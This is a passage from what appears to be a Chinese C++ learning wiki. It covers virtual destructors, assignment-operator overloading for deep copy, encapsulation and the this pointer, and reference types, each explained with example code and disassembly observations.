Sub::Function_2 called…virtual 像Function_2()这样，同样一个函数却能体现不同的行为，这便是多态。 注意只有通过upcatsing（父类指针/引用指向子类对象）且调用virtual functions，才是late binding，才是多态 virtual functions &amp; constructors 参考：《Thinking in c++》2th，P695-701 Order of constructor calls 构造函数的任务是确保对象built properly，包括VPTR被正确指向proper VTABLE，成员变量的初始化。 构造函数调用次序要按照基类到最晚派生类顺序的理由（ putting an object together piece-by-piece, first by calling the base constructor, then the more derived constructors in order of inheritance）： 子类只能访问到父类中public和protected的成员，只有父类的构造函数才能初始化它自己的private成员 VPTR可能需要更新：父类中有虚函数时，父类的构造函数会将VPTR指向父类的VTABLE。如果子类重写了虚函数，VRTP又将设置为指向子类的VTABLE，以此类推，直到最后的构造函数结束。The state of the VPTR is determined by the constructor that is called last. virtual constructors? &amp; virtual functions inside constructors 构造函数为什么不能是虚函数？ 原因：构造函数负责对象的初始化，这时vptr都没建立完成，如何多态？ 如果在构造函数中调用虚函数会发生什么？ vptr没完全正确的初始化，在后续的构造函数中可能会继续更新，这时的调用可能是灾难性的 Destructors and virtual destructors Order of Destructor calls 与构造函数相似，析构函数的工作是disassemble an object that may belong to a hierarchy of classes。但析构函数的调用顺序与构造函数顺序相反，这是因为： 释放工作先由派生类析构属于自己的对象，然后向上到基类析构，这是安全且合理的（属于子类的成员析构完后，父类成员仍是有效的，子类的析构中仍可以调用父类的成员函数） 在栈中的对象在堆中的对象以局部变量为例，全局变量在全局区，一样的，略 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Base &#123;public: Base() &#123; printf(&quot;Base() called &quot;); &#125; ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main() &#123; Derived* d = new Derived(); // 在堆上创建对象 delete d; // 释放对象 return 0;&#125; 构造函数顺序析构函数顺序 new方式创建的对象在堆中，用delete进行释放 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;class Base &#123;public: Base() &#123; std::cout &lt;&lt; &quot;Base() called&quot; &lt;&lt; std::endl; &#125; ~Base() &#123; std::cout &lt;&lt; &quot;~Base() called&quot; &lt;&lt; std::endl; &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; std::cout &lt;&lt; &quot;Derived() called&quot; &lt;&lt; std::endl; &#125; ~Derived() &#123; std::cout &lt;&lt; &quot;~Derived() called&quot; &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Derived *d = new Derived(); // 在堆上创建对象 delete d; // 释放对象 return 0;&#125; 构造函数顺序析构函数顺序 使用delete删除一个对象时，首先调用该对象的析构函数来清理资源，然后释放分配给该对象的内存。 virtual destructors 参考：C++ 中的基类为何在析构函数中添加 virtual？ - 姚冬的回答 - 知乎 写一个类，类的析构函数建议写成虚函数，确保当用基类类型的指针去delete一个派生类的实例的时候，可以让派生类的析构函数被调用。 123456789101112class Base&#123; virtual ~Base() &#123;&#125;&#125;;class Derived : public Base&#123; ~Derived() &#123;&#125;&#125;;Base *p = new Derived();delete p; 这个情况发生在一个类被继承，然后开发者会写多态的代码（upcasting + new方式的对象），但释放时如果父类的析构函数不是虚函数，释放对象时只会调用父类的析构函数，这样就只释放掉父类对象的内存，而子类对象相比于父类多出来的那部分并没有释放掉。 对象在堆栈或全局变量区是没这个问题的，当对象的生命周期结束时（如函数返回，或，程序结束），对象销毁时，它们的析构函数会按照正确的顺序执行（先派生类，后基类） 例 构造函数顺序：Base()-&gt;Derived() 析构函数顺序：~Derived()-&gt;~Base() 非虚析构函数虚析构函数12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Base &#123;public: Base() &#123; printf(&quot;Base() called &quot;); &#125; ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main() &#123; Base* p = new Derived(); // 父类指针指向子类对象 delete p; // 释放时只会调用父类的析构 return 0;&#125; 只调用了~Base() 跟进delete的反汇编看什么情况。 前面new得到一个堆中的内存地址，用eax存到局部变量区[ebp-18h]，将[ebp-18h]作为this指针传给构造函数进行初始化。 delelte时也是传这内存编号，push 1猜是因为只有1个对象要销毁，如果delete []要算一共多少个对象 使用delete删除一个对象时，首先调用该对象的析构函数来清理资源，然后释放分配给该对象的内存。 因为是Base*类型指针，这里传this指针然后调用Base类的析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;class Base&#123;private: int x;public: Base() &#123; x = 1; printf(&quot;Base() called &quot;); &#125; virtual ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() &#123; y = 2; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main()&#123; Base* p = new Derived(); // 父类指针指向子类对象 delete p; // 析构函数会多态 return 0;&#125; 析构时正确了，看反汇编和非析构函数的区别。 看到delete时call变成了间接调用虚表，[ebp-1Ch]是new返回的堆的内存地址，然后得到vptr（mov edx,dword ptr [ecx]），然后去虚表调用虚函数地址（call dword ptr [edx]），在下方的变量监视窗口看到虚表中是Derived::~scalar deleting destructor 构造函数和析构函数是编译器在编译时帮我们插入生成的，其实它们也是个函数。使用父类指针指向子类对象时，如果父类析构函数不是虚函数，那么delete p时，编译器只知道调用Base类的析构函数。而将Base类中的析构函数写成虚析构函数时，delete p会发生多态，根据具体的对象，来调用那个对象的析构函数（Sound familiar? This is the same problem that virtual functions were created to solve for the general case. Fortunately, virtual functions work for destructors as they do for all other functions except constructors. ） 小结 写一个类时，将析构函数写成虚函数是一个好的做法。因为你并不知道其他人在使用这个代码时会不会继承这个类，然后用基类类型的指针去delete一个派生类实例。 是一个好的做法，尤其是在涉及继承时，因为它确保了当通过基类指针删除派生类对象时，适当的析构函数被调用 开发中忽略了将父类析构函数声明为虚析构函数的例子 咔咔写了使用多态的代码（arr[i]-&gt;Print();），用了new的方式，用了upcasting（父类指针指向子类对象），最后delete时会有隐藏的陷阱（只释放了父类的对象内容） 1234567891011121314void TestBound() &#123; Base* arr[] = &#123;new Base(), new Sub1(), new Sub2()&#125;; // 使用 new 创建对象 for (int i = 0; i &lt; 3; i++) &#123; arr[i]-&gt;Print(); //多态 &#125; for (int i = 0; i &lt; 3; i++) &#123; delete arr[i]; // 删除对象时没多态，只调用父类的析构函数 &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;class Base &#123;public: int a; Base() &#123; a = 1; printf(&quot;Base() called. Set a = 1 &quot;); &#125; ~Base() &#123; printf(&quot;Base destructor called &quot;); &#125; virtual void Print() &#123; printf(&quot;Base::Print() called: a=%d &quot;, a); &#125;&#125;;class Sub1 : public Base &#123;public: int x; Sub1() &#123; a = 2; x = 10; printf(&quot;Sub1() called. Set a=2 and x=10 &quot;); &#125; ~Sub1() &#123; printf(&quot;Sub1 destructor called &quot;); &#125; void Print() &#123; printf(&quot;Sub1::Print() called: a=%d, x=%d &quot;, a, x); &#125;&#125;;class Sub2 : public Base &#123;public: int y; Sub2() &#123; a = 3; y = 20; printf(&quot;Sub2() called. Set a=3 and y=20 &quot;); &#125; ~Sub2() &#123; printf(&quot;Sub2 destructor called &quot;); &#125; void Print() &#123; printf(&quot;Sub2::Print() called: a=%d, y=%d &quot;, a, y); &#125;&#125;;void TestBound() &#123; Base* arr[] = &#123;new Base(), new Sub1(), new Sub2()&#125;; // 使用 new 创建对象 for (int i = 0; i &lt; 3; i++) &#123; arr[i]-&gt;Print(); //多态 &#125; for (int i = 0; i &lt; 3; i++) &#123; delete arr[i]; // 删除对象时没多态，只调用父类的析构函数 &#125;&#125;int main() &#123; TestBound(); return 0;&#125;"},{"title":"对象拷贝-重载赋值运算符","path":"/wiki/C++/对象拷贝-重载赋值运算符.html","content":"前言 对象拷贝指的是创建一个新对象，使其成为某个已存在对象的副本。有两种方式来实现对象拷贝：拷贝构造函数（Copy Constructor），和，重载赋值运算符(=)。本小节讲解重载赋值运算符(=)的方式完成对象拷贝。 语法形式 C++的赋值运算符号=，左右操作数是支持对象的。 简单对象-拷贝构造函数有父类的对象-拷贝构造函数执行后，b2、b3是b1对象的拷贝，x的值都被拷贝成1 123456789101112131415161718192021222324class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;int main()&#123; Base b1(1); // Base parameterized constructor called here Base b2(2); b2 = b1; // 使用赋值运算符来拷贝对象，Base 赋值运算符被调用 Base *b3 = new Base(3); // 先在堆上创建一个对象 *b3 = b1; // 然后使用赋值运算符，Base 赋值运算符被调用 // ... 使用 b2 和 b3 ... // 注意：创建在堆上的对象需要手动删除 delete b3;&#125; 赋值运算符(=)也是对整个对象的复制，包括从父类继承下来的成员。 123456789101112131415161718192021222324252627282930313233class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x), y(y) &#123;&#125;&#125;;int main()&#123; Derived d1(1, 1); // Derived parameterized constructor called here Derived d2(2, 2); d2 = d1; // 使用赋值运算符来拷贝对象 Derived *d3 = new Derived(3, 3); // 在堆上创建的一个对象 *d3 = d1; // 使用赋值运算符来拷贝对象 // ... 使用 d2 和 d3 ... // 注意：创建在堆上的对象需要手动删除 delete d3;&#125; 赋值运算符的问题 赋值运算符(=)和拷贝构造函数一样，都是将成员的值直接赋值，都是“浅拷贝”。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;cstring&gt;#include &lt;cstdio&gt; // 包含用于 printfclass String &#123;public: char* str; // 指针成员 int length; // 基本数据类型成员 // 构造函数 String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //指针成员指向了申请的内存 strcpy(this-&gt;str, str); &#125; // 默认的赋值运算符是浅拷贝 // 析构函数 ~String() &#123; delete[] str; //析构中释放申请的内存 printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); String s2(&quot;temp&quot;); s2 = s1; // 会使用默认的赋值运算符（浅拷贝） printString(s2); // 打印 s2 // 注意，此时 s1 和 s2 的 str 成员指向同一块内存 // 退出main时，s1和s2会被销毁，对同一块内存进行两次释放&#125; // s1 和 s2 在这里被销毁，对同一块内存进行两次 delete 可以看到默认的赋值运算符(=)和默认拷贝构造函数一样，也只是将s1对象的成员变量str和length的值拷贝了一份，并没有将s1.str指向的那块内存的内容也拷贝一份。浅拷贝导致现在出现了问题：s2.str指向了同一块内存。 如果我们想实现对指针所指向数据的复制，即深拷贝（Deep Copy），就需要自己重载赋值运算符(=) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;cstring&gt;#include &lt;cstdio&gt; // 包含用于 printfclass String &#123;public: char* str; // 指针成员 int length; // 基本数据类型成员 // 构造函数 String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //指针成员指向了申请的内存 strcpy(this-&gt;str, str); &#125; // 深拷贝的赋值运算符重载 String&amp; operator=(const String&amp; other) &#123; if (this != &amp;other) // 防止自赋值 &#123; length = other.length; delete[] str; // 删除传进来对象原先占用的旧内存 str = new char[length + 1]; strcpy(str, other.str); &#125; return *this; &#125; // 析构函数 ~String() &#123; delete[] str; //析构中释放申请的内存 printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); String s2(&quot;temp&quot;); s2 = s1; // 使用赋值运算符进行深拷贝 printString(s2); // 打印 s2 // 注意，此时 s2 指向的是新的内存 &#125; // 退出main时，s1和s2会被销毁，它们指向的是不同的内存，所以安全 s2.str指向的是新的内存地址，且那块内存里的内容也和s1一样 子类重载赋值运算符写法 在子类重载赋值运算符函数中显式调用父类的重载赋值运算符函数 12345678// 派生类的赋值运算符重载Derived&amp; operator=(const Derived&amp; other) &#123; if (this != &amp;other) // 防止自赋值 &#123; Base::operator=(other); // 显式调用基类的赋值运算符 derivedValue = other.derivedValue; &#125; 调用Derived赋值运算符函数时，会在函数中调用Base::operator=(other);让父类完成父类成员的拷贝，然后在执行Derived&amp; operator=(const Derived&amp; other) 函数里剩下的代码完成Derived类自己特有的成员。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;cstdio&gt;class Base &#123;public: int baseValue; // 基类的构造函数 Base(int value) : baseValue(value) &#123;&#125; // 基类的赋值运算符重载 Base&amp; operator=(const Base&amp; other) &#123; if (this != &amp;other) // 防止自赋值 &#123; baseValue = other.baseValue; &#125; printf(&quot;Base assignment operator called &quot;); return *this; &#125;&#125;;class Derived : public Base &#123;public: int derivedValue; // 派生类的构造函数 Derived(int baseValue, int derivedValue) : Base(baseValue), derivedValue(derivedValue) &#123;&#125; // 派生类的赋值运算符重载 Derived&amp; operator=(const Derived&amp; other) &#123; if (this != &amp;other) // 防止自赋值 &#123; Base::operator=(other); // 调用基类的赋值运算符 derivedValue = other.derivedValue; &#125; printf(&quot;Derived assignment operator called &quot;); return *this; &#125;&#125;;int main() &#123; Derived original(10, 10); Derived copy(20, 20); // 这将调用派生类的拷贝构造函数 copy = original; // 使用赋值运算符进行对象拷贝 printf(&quot;Original: baseValue = %d, derivedValue = %d &quot;, original.baseValue, original.derivedValue); printf(&quot;Copy: baseValue = %d, derivedValue = %d &quot;, copy.baseValue, copy.derivedValue); return 0;&#125; 小结 如果不需要深拷贝，使用赋值运算符即可，编译器会自动生成对象拷贝的代码 如果类中含有指针成员，那就必须要自己重载赋值运算符，因为默认赋值运算符是浅拷贝，无法去做申请一块内存这种复杂动作 注：如果自己实现赋值运算符重载，所有成员的拷贝就要自己来处理"},{"title":"封装和this指针","path":"/wiki/C++/封装和this指针.html","content":"面向对象和面向过程三个本质的区别：封装，继承，多态。 封装 C++在C的基础上做拓展（封装、继承、多态、模板等），这些拓展能让编程的人写代码更省事，但省下来的这些事并没有凭空消失，反而是编译器做的事情更多了，由编译器帮我们生成代码。下面我们通过一些例子，来体会封装这个概念。 例1 123456789101112131415161718struct Student &#123; int a; int b; int c; int d;&#125;; int Plus(Student s) &#123; return s.a + s.b + s.c + s.d;&#125; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = Plus(s); return;&#125; 结构体作为函数参数，生成的汇编代码是内存复制。编译器不确定这个结构体有多少个参数，每个参数是什么类型。所以结构体传参生成的汇编代码就是先提升堆栈给空间，然后一个一个移。 例2 例1使用结构体作为函数参数，会发生大片内存的复制移动，开销大。建议使用结构体指针作为参数 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d;&#125;; int Plus(Student* p) &#123; return p-&gt;a + p-&gt;b + p-&gt;c + p-&gt;d;&#125; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = Plus(&amp;s); return;&#125; 例3 例2还是存在问题： 函数内部使用结构体成员时：如果这个结构体是40个成员要相加呢？每个变量都要用这样的形式表示p-&gt;a，那太麻烦了 函数参数列表：如果有40个类似plus的函数，每个函数都要用这个结构体指针作为参数呢？ 从上面两点，我们看到了麻烦的地方，我们的解决办法是：把函数写到结构体里，这就是一种封装，函数可以方便地使用结构体里的变量。 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; int Plus() &#123; return a + b + c + d; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = s.Plus(); return;&#125; 第19行，前面用s.，说明调用的是类s中的plus函数，而不是其他类的plus函数。 或者说，调用的不是ss结构体中的plus函数 并且看调用plus函数时的反汇编代码，和例2是一样的。我们不再需要去写传参、再去使用指针的调用方式，这些工作都由编译器帮我们完成了。 plus函数内部的代码和例2也是一样的 例3的plus函数内部例2的plus函数内部 注意：plus函数还是在全局的地址，并不在结构体里。 证明方式一：例3plus函数地址为00401014，例2plus函数地址为0040100F。 方式二：sizeof(Student)看一下，结果是16（4个int类型之和） 综上，这就是C++封装（函数放到结构体里）这个概念的推导过程。那么我们就可以很容易理解C++中的这些新概念： 类：带有函数的结构体，称为类 成员函数：结构体里的函数，称为成员函数 放外面的函数和放在类中的函数的区别： 对于底层人员，逆向的人：没有区别 对于编译器：作用范围变了，要用类.成员函数来访问 调用方式 参数 放外面的函数 函数名 放在类中的函数 对象.成员函数 多传了个this指针 this指针 看回上一节例3的反汇编代码 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; int Plus() &#123; return a + b + c + d; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = s.Plus(); return;&#125; 调用plus函数时并没有传参数，却发现了结构体Student首地址通过ecx寄存器传过来了。 即使将Student中plus函数改为不返回任何值（void返回类型），函数内部也不做任何操作，结构体Student首地址还是会被当参数传过来 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; void Plus() &#123; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; s.Plus(); return;&#125; 也就是说，this指针是编译器默认传入的，用ecx寄存器传递。 既然成员函数都会有this指针这个参数，那么在成员函数中能否使用这个指针？答案是可以的。 下面的程序，通过Init来初始化成员的值，一个是不合预期的用法，一个是正确的用法。 不合预期的用法合预期的用法123456789101112131415161718struct Student &#123; int a; int b; void Init(int a, int b) &#123; a = a; b = b; &#125; &#125;; void main() &#123; Student s; s.Init(1,2); return;&#125; 反汇编看到从[ebp+8]取出值放到eax，又放回[ebp+8]。 这是因为函数内部用变量a，是指参数。如果是指成员变量a，要用this指针。1234567891011121314151617struct Student &#123; int a; int b; void Init(int a, int b) &#123; this-&gt;a = a; this-&gt;b = b; &#125; &#125;; void main() &#123; Student s; s.Init(1,2); return;&#125; this指针将Student类的首地址传进来了，所以可以通过这个地址来寻址，找到成员变量a的位置 小结 成员函数都有this指针，this指针指向的是该类的首地址，无论该成员函数内部是否使用到this指针 this指针是编译器默认传入的，通常使用ecx寄存器进行传递（可作为反汇编时判断目标程序编写语言是C还是C++的依据）。 成员函数用的函数调用约定是thiscall 调用约定 参数传递方式 谁负责平栈？ 场景 thiscall 从右向左入栈如果参数个数确定, this指针通过ecx传递给被调用者, 如果参数个数不确定, this指针在所有参数压栈后被压入堆栈 参数个数不定的, 调用者calling function清理堆栈 ，外平栈参数个数确定的，被调方called function，清理堆栈，内平栈 成员缺省调用约定 this指针的作用 区分参数和成员变量 返回当前对象的首地址 1234567891011121314151617181920#include &lt;stdio.h&gt;struct Student &#123; int a; int b; // 成员函数，返回当前对象的首地址 Student* getAddress() &#123; return this; &#125;&#125;; void main() &#123; Student s; printf(&quot;%p &quot;,s.getAddress()); return;&#125; this不能做运算，不能被重新赋值 this指针存在的意义就是方便编程人员使用类中的成员，而对this指针做运算，加减，重新赋值这些操作，没有意义，违背了编译器的初衷。（直接对this做运算编译会不通过。当然，想改的话，强转为其他类型然后再运算也能改） this指针存在的含义就是指向当前这个对象的首地址，对它做任何操作都是无意义的。 对于编译器而言，this指针的值永远只有一个，永远不需要变化。 this指针不占用结构体的宽度 练习 空结构体的大小是多少？为什么？ 答案防止：声明了一个空类，然后实例化了不同的对象，而这些对象拥有相同的地址，那就麻烦了。chatgpt：在C语言中，空结构体的大小是未定义的。C99标准指出，如果结构体声明列表不包含命名成员，则其行为是未定义的。然而，GCC允许定义一个没有成员的结构体，并将其大小定义为0。但是，这并不是标准C的行为，而是特定编译器的扩展。在Cpp中，空结构体的大小是1字节。这是因为C标准规定，每个对象必须有一个独一无二的地址，即使是空对象。如果空结构体的大小是0，那么两个不同的空结构体实例可能会得到相同的地址，这违反了标准。因此，C中空结构体至少占用1字节的空间，以确保每个实例都有一个唯一的地址。参考：为什么C++ 中空类的大小是1个字节？ 下面这段代码能否执行？ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;struct Person &#123; void Fn_1() &#123; printf(&quot;Person:Fn_1() &quot;); &#125; void Fn_2() &#123; printf(&quot;Person:Fn_2() &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; Person* p = NULL; p-&gt;Fn_1(); p-&gt;Fn_2(); return 0; &#125; 答案能执行。成员函数不在结构体中，编译时就已确定了函数的地址。而且在这个例子中Fn_1和Fn_2没有用到成员变量，this指针为0也没关系。我们仍能够通过p-&gt;Fn_1()和p-&gt;Fn_2()的方式来调用这两个函数。尽管如此，这样做是危险且不提倡的。chatgpt的回答：这段C++代码之所以能够执行，主要是因为成员函数（member function）调用在编译时就已经确定了函数的地址。在这个例子中，Fn_1和Fn_2都不需要访问任何非静态成员变量，因此它们实际上并不需要一个有效的this指针。当你创建一个类的对象并调用其成员函数时，this指针通常指向对象的内存地址。然而，如果成员函数不访问对象的任何成员变量（即它们不依赖于对象的状态），那么它们实际上并不需要一个指向有效对象的this指针。在你的代码中，Person* p = NULL;将p初始化为NULL，这意味着它不指向任何有效的内存地址。尽管如此，你仍然能够调用p-&gt;Fn_1()和p-&gt;Fn_2()，因为这些函数内部不访问任何Person对象的成员变量。然而，这种做法是危险的，因为如果Fn_1或Fn_2函数试图访问对象的成员变量或者调用其他依赖于this指针的成员函数，程序将会崩溃，因为this指针是NULL。 下面这段代码能否执行？ 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;struct Person&#123; int x; void Fn_1() &#123; printf(&quot;Person:Fn_1() &quot;); &#125; void Fn_2() &#123; x = 10; printf(&quot;Person:Fn_2() &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; Person *p = NULL; p-&gt;Fn_1(); p-&gt;Fn_2(); return 0;&#125; 答案编译通过，执行报0xC0000005访问错误。this指针指向地址0，Fn_1()还是可以调用，因为没用到this指针，但是Fn_2()函数执行会报错，因为该函数里x=10这句用到了this指针，它想把0地址处起的int大小改为10，但0地址没挂物理页，所以报错。"},{"title":"小结","path":"/wiki/C++/小结_C++.html","content":"Cpp相比C，编译器更智能了，背后帮编程人员做了很多事情，编程人员开发更高效，方便了。学习C++，就是学习编译器背后做了哪些事情，依此写出高效可靠安全的代码。 OOP三大特性 面向对象相比于面向过程三个本质的区别：封装，继承，多态。 封装：将函数写到结构体（类）中，让函数可以方便地使用结构体里的变量。 继承：数据的复用，减少重复代码的编写 private只是编译器编译时的限制，private成员的内存布局与public没差别，想访问是拦不住的。 多态：间接调用+虚表 虚表 当一个类有虚函数后，该对象的起始地址存放的是vptr指针，随后才是成员变量。vptr指向虚表（一个存放函数地址的数组），虚表中存放类中所有虚函数的函数地址（按虚函数在代码中声明的先后顺序）。 如果子类没有对基类声明的虚函数进行重写（override），那么表项中的是父类的虚函数地址。如果重写了，这一项则是子类重写的函数地址。 对于多重继承，虚表的个数=继承父类的个数。内存布局先是第一个父类的内存，然后是第二个父类的内存，…，最后才是子类的。 子类新增的虚函数函数地址是在第一个虚表中。 override了父类哪个的虚函数就在哪个表中，没有override就仍是父类的。 虚析构函数 析构函数建议写成虚函数，让析构函数也发生多态，当用基类类型的指针去delete一个派生类的实例的时候（delete的背后编译器会插入调用析构函数的代码），可以是调用子类的析构函数去释放子类对象（在子类对象的析构函数中，会先调用父类析构函数，再调用子类的析构函数）。否则，只有父类的析构函数被调用。 123456789101112class Base&#123; virtual ~Base() &#123;&#125;&#125;;class Derived : public Base&#123; ~Derived() &#123;&#125;&#125;;Base *p = new Derived();delete p; 模板 模板的本质就是编译器帮替换typename，生成代码，其反汇编和正常写法写出来的是一样的 友元 破坏了OOP的封装性，不建议使用。 但运算符重载时会用到：如果一个操作符已经是写好的，要用在自己的类上，只能声明友元函数，没法在自己的类中用成员函数。比如重载输入输出运算符（&lt;&lt; 和 &gt;&gt;），因为标准输入输出流（例如 std::ostream 和 std::istream）不是类的成员。 运算符重载 运算符重载本质就是函数替换 用途：开发者需要自定义运算符规则，比如两个对象相+，作比较等 写运算符重载时要注意函数的返回类型 引用 自测问题： 什么是引用类型 它解决了什么问题 为什么要用引用类型 它有什么特点 C语言的指针的灵活同时也带来了不安全的隐患，开发时可能会不小心将指针指向不该指的地方。于是cpp发明了引用类型，让引用可以像指针那样去访问、修改对象的内容，但更加安全。 声明引用类型的变量时必须赋初始值，且只能指向一个变量，“从一而终” “从一而终”是因为上边我们尝试通过对引用赋值、做运算，发现都改变不了引用本身的值，改的都是引用所指向那个变量的值 对引用赋值，是对其指向的变量赋值，而不是修改引用本身的值 对引用做运算，就是对其指向的变量做运算，而不是对引用本身做运算 引用可以理解成是编译器维护的一个指针，但并不占用空间 海哥提出的，引用和指针在编译后，在底层是一样的，没有区别。引用是编译器在开发时做了限制，防止意外，出现不安全的操作。 不占用空间是指，在反汇编中找不到引用的影子，找不到在哪块内存存了引用的值。而指针是有空间存这个指针指向的内存地址。 引用类型就是一个弱化了的指针，使用引用可以像指针那样去访问、修改对象的内容，但更加安全。"},{"title":"引用类型","path":"/wiki/C++/引用类型.html","content":"引用类型用法 引用就是变量的“别名”，References must be initialized when defined 下面分别创建基本类型、类、指针类型、数组类型的引用类型，并使用引用类型。来看下引用类型的用法 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Person&#123;public: int x;&#125;;int main()&#123; // 基本类型 int x = 10; int&amp; ref1 = x; ref1 = 20; // 通过引用类型修改x printf(&quot;%d &quot;, x); // 打印x的值，观察修改情况，看到输出是20 // 类 Person p; p.x = 10; Person &amp;ref2 = p; ref2.x = 20; // 通过引用类型修改x printf(&quot;%d &quot;, p.x); // 打印p.x的值，观察修改情况，看到输出是20 // 指针类型 int** y = (int **)10; // 指针y指向10 int**&amp; ref3 = y; // 两个**，int**后加个&amp;，就是int**&amp; ref3 = (int**)20; // 通过引用类型修改x printf(&quot;%d &quot;, y); // 打印y的值，观察修改情况，看到输出是20（指针现在指向了20） // 数组类型 int arr[] = &#123;10, 20, 30&#125;; int(&amp;ref4)[3] = arr; // int(*p)[3]数组指针，*换成&amp;，就是int(&amp;p)[3] ref4[0] = 20; // 通过引用类型修改数组第一个元素的值 printf(&quot;%d &quot;, arr[0]); // 打印arr[0]的值，观察修改情况，看到输出是20 return 0;&#125; 引用类型的本质 通过反汇编查看上面代码中的引用类型是怎么实现“变量的别名”这一功能 以基本类型引用为例，其他的类型道理一样的 12345678910111213141516171819#include &lt;stdio.h&gt;int main()&#123; // 基本类型 int x = 10; //引用类型 int&amp; ref = x; ref = 20; // 通过引用类型修改x printf(&quot;%d &quot;, x); // 打印x的值，观察修改情况，看到输出是20 //指针 int* p = &amp;x; *p = 30; // 通过指针修改x printf(&quot;%d &quot;, x); // 打印x的值，观察修改情况，看到输出是30 return 0;&#125; 发现引用类型和指针反汇编是一样的 引用类型和指针的区别 从上面的例子，暂且得出一个结论：引用就是指针。但细想，如果引用就是指针，C++为什么要发明引用类型？接下来，我们让指针类型，引用类型分别做初始化，运算，赋值，来对比观察它们的不同： 基本类型对象1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int x = 10; //初始化 int* p = &amp;x; //指针 int&amp; ref = x; //引用 //运算 p++; //指针 ref++; //引用 //赋值 p = (int*)20; //指针 ref = 20; //引用 return 0;&#125; 堆栈地址 存的值 备注 ebp-0Ch x的地址 引用类型ref的值 ebp-8 x的地址 指针p的值 ebp-4 变量x int类型，变量x的值 操作 指针 引用 初始化 都是取变量x的地址 都是取变量x的地址 运算 指针p的值++了 变量x的值++了 赋值 指针p的值被改了 变量x的值被改了 指针是独立的个体，对指针做运算和赋值，都是修改指针的值；引用不是独立的个体，ref变量代表不了它自己，它存的值永远是它所代表变量的地址，对引用类型进行运算，赋值等操作，操作的并不是ref变量本身，而是它所代理的变量的值（在该例中为x），所以我们说引用是“变量的别名” 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;class Base&#123;public: int x; int y; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;int main()&#123; Base b(1, 2); // 初始化 Base* p = &amp;b; // 指针 Base&amp; ref = b; // 引用 // 运算 p++; // 指针 // ref++; //编译会报错。ref是b的别名，对象b不能b++，ref就不能ref++ ref.x++; // correct ref.y++; // correct // 赋值 p = (Base*)20; // 指针 // ref=20; //编译会报错。ref是b的别名，对象b不能b=20，ref就不能ref = 20 ref.x = 10; // correct ref.y = 20; // correct return 0;&#125; 声明引用类型变量和初始化那行，引用像指针。但在使用引用类型变量时，它和它代表的那个对象/变量用法一样。 非要在反汇编中看出引用和指针的区别，首先判断出它是指针或引用，然后如果看到这个值重新指向了别的地方，那就说明是指针。 在逆向分析时，汇编代码中只有地址的概念，也没必要分指针/引用。 小结 声明引用类型的变量时必须赋初始值，且只能指向一个变量，“从一而终” “从一而终”是因为上边我们尝试通过对引用赋值、做运算，发现都改变不了引用本身的值，改的都是引用所指向那个变量的值 对引用赋值，是对其指向的变量赋值，而不是修改引用本身的值 对引用做运算，就是对其指向的变量做运算，而不是对引用本身做运算 引用可以理解成是编译器维护的一个指针，但并不占用空间 海哥提出的，引用和指针在编译后，在底层是一样的，没有区别。引用是编译器在开发时做了限制，防止意外，出现不安全的操作。 不占用空间是指，在反汇编中找不到引用的影子，找不到在哪块内存存了引用指向的那个地址。而指针是有空间存这个指针指向的内存地址。 引用类型就是一个弱化了的指针，使用引用可以像指针那样去访问、修改对象的内容，但更加安全。 